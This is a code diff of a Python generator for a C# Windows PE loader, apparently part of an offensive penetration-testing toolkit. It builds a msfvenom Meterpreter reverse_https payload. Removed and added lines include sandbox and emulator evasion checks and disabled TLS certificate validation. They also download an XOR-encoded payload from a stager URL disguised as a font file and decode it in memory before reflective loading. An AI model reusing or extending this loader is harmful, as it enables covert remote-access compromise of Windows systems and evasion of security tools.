@@ -1,17 +1,17 @@
 #!/bin/env python3
+import ak
 from ak import *
 import os
 import subprocess
 import base64
 
-LHOST = "192.168.49.65"
-LPORT = 443
 BASE_FILENAME = 'win_peloader'
-MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f exe -e generic/none"
-XOR_KEY = b'\x09'
-STAGER_URL = "http://192.168.49.65/FontAwesome.woff"
+MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f exe -e generic/none"
+XOR_KEY = b'\x00'
+STAGER_URL = "http://192.168.49.65/FontAwesome.exe"
 
 def generate(shellcode):
+  url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=STAGER_URL)
   template = """
 using System;
 using System.IO;
@@ -26,42 +26,16 @@ namespace PELoader
     class peloader
     {{
 
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr GetCurrentProcess();
-
-        [DllImport("kernel32.dll")]
-        static extern void Sleep(uint dwMilliseconds);
+        {ak.HEURISTICS_IMPORT}
+        {ak.ARCH_DETECTION}
 
         public static void Main()
         {{
-            DateTime t1 = DateTime.Now;
-            Sleep(2000);
-            double t2 = DateTime.Now.Subtract(t1).TotalSeconds; if(t2 < 1.5)
-            {{ return; }}
+            {ak.HEURISTICS_CODE}
 
-            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
-            if (mem == null)
-            {{
-                return;
-            }}
-
-	    //byte[] unpacked = {{ {xor_shellcode_hex} }};
-
-            string url = "{stager_url}";
-
-            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
-            System.Net.WebClient client = new System.Net.WebClient();
-            byte[] unpacked = client.DownloadData(url);
-
-            for (int i = 0; i < unpacked.Length; i++)
-            {{
-                unpacked[i] = (byte)(((uint)unpacked[i] ^ {xor_key}) & 0xFF);
-            }}
+            {URL_DL_CODE}
             
-            PELoader pe = new PELoader(unpacked);
+            PELoader pe = new PELoader(buf);
 
             IntPtr codebase = IntPtr.Zero;
 
@@ -604,7 +578,9 @@ namespace PELoader
 
     }}
 }}
-  """.format(xor_shellcode_hex=shellcode.get_hex_csharp(), xor_key=shellcode.get_key_csharp(), stager_url=STAGER_URL)
+  """.format(ak=ak,
+             URL_DL_CODE=url_dl_code,
+             xor_shellcode_hex=shellcode.get_hex_csharp(), xor_key=shellcode.get_key_csharp(), stager_url=STAGER_URL)
 
   print(template)
   f = open(BASE_FILENAME + ".cs", "w")
